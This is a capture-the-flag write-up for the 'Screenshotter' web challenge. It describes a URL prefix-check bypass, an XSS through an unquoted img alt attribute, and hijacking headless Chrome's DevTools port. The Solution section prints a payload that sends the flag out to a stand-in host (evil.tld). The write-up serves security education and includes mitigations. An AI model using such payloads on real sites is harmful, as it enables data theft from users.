# Screenshotter

## Information
**Category**: Web  
**Difficulty**: Medium    
**Author:** LiveOverflow  
**Points:**
- **Junior:**   ?  
- **Senior:**   ?    
- **Earth:**    ?   

**First Blood:**    
- **Junior:**   LinHe  
- **Senior:**   mawalu
- **Earth:**    Qyn

**Description:**
>Screenshotter is a novel web app to quickly take notes and screenshots.   
>Simply enter the URL of a website and store a screenshot of it.   
>Currently in beta, only cscg.de screenshots are allowed.  

**Challenge Files:**   
- `screenshotter.zip`   

## Overview
---
This is a docker setup with three containers `chrome`, `screenshotter` and `app`
In the ZIP file there is a `docker-compose.yaml` and three folders `admin`, `app` and `chrome`.

The `screenshotter` container hosts the website.    
On the website you can register, save notes and take screenshots. There is also a public log of all actions.   
The `admin` container saves a note with the flag at startup and takes screenshots of `http://cscg.de` periodically.   
The Chrome container is just a headless Chrome instance that takes the screenshots. The browser is controlled via port 9222 and the [Chrome DevTools Protocol](https://chromedevtools.github.io/devtools-protocol/).   

## Solution   
---
### 1. Bypass cscg.de restriction
The Python code only checks the beginning of the URL:
`if body.startswith('https://www.cscg.de') or body.startswith('http://cscg.de'):`   
For example, if the URL would be `http://cscg.de.example.tld` it would also be accepted.
So I just created a subdomain and used it as a bypass.

### 2. XSS on /notes
The title of the captured website is also displayed as img alt attribute.   
But since this is not additionally sanitized the title will be packed directly into the img tag.   
`alt={{ note.title }}`   
If there are spaces in the title then this happens:   
`alt="Cyber" Security Challenge Germany`  
With for example this title you can now execute your javascript with onload:   
`abc onload=alert(0)`   
The resulting img tag looks like this:   
`alt="abc" onload=alert(0)`   
This allows you to execute any javascript on the load of the website.   
### 3. Access flagger's browser tab and attack it
Through the Chrome browser, I can access port 9222 and control Chrome this way.   
I first let me show all open tabs by an iframe under the address `http://127.0.0.1:9222/json/list`. 
There is an about:blank tab there. I redirect this tab to the list of open tabs under the URL `http://127.0.0.1:9222/json/list`.    
There a javascript filters the json values for the ID of the tab of flagger and changes the title to the XSS payload.   
My Payload I have chosen is:   
`Cyber onload=window.location.replace(`http://evil.tld/`+document.getElementsByTagName(`pre`)[0].innerText)"`   
I have combined everything in the `exploit.html`.    
When starting the challenge you have to call the page once to then adjust the ID in the `exploit.html`.    
If you see in the log that flagger has submitted a screenshot, submit the `exploit.html` again.
Now you should receive the flag at your `evil.tld`

## Mitigation    
---
The user's input and the alt tag should be properly sanitized.   
Also the access as user to port 9222 and at best the complete sharing of the chrome container should be prevented. 

Leon T.